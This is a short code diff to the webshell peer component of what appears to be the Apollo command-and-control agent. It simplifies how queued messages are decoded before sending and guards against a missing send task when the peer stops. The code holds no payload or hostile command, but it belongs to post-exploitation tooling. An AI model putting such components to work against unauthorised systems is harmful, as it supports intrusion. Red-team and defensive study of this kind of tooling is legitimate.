@@ -51,12 +51,7 @@ namespace Apollo.Peers.Webshell
                     _senderEvent.WaitOne();
                     if (!_cts.IsCancellationRequested && _senderQueue.TryDequeue(out byte[] result))
                     {
-                        AS.IPCChunkedData chunkedData = _serializer.Deserialize<AS.IPCChunkedData>(Encoding.UTF8.GetString(result));
-                        if (chunkedData.Data.Length == 0)
-                        {
-                            continue;
-                        }
-                        string data = Encoding.UTF8.GetString(Convert.FromBase64String(chunkedData.Data));
+                        string data = Encoding.UTF8.GetString(result);
                         //DebugHelp.DebugWriteLine($"Got data to send: {data}, _sendAction in WebshellPeer, to {_mythicUUID} from {_uuid}");
                         Send(data);
                     }
@@ -172,7 +167,9 @@ namespace Apollo.Peers.Webshell
             //DebugHelp.DebugWriteLine($"Stop()");
             _cts.Cancel();
             _senderEvent.Set();
-            _sendTask.Wait();
+            if(_sendTask != null){
+                _sendTask.Wait();
+            }
             OnDisconnect(this, new EventArgs());
         }
     }
